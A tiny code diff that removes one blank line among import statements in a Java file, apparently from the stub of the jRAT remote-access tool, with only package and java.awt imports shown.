@@ -2,7 +2,6 @@ package io.jrat.stub.packets.outgoing;
 
 import io.jrat.common.io.StringWriter;
 import io.jrat.common.utils.Utils;
-
 import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
 import java.awt.Rectangle;
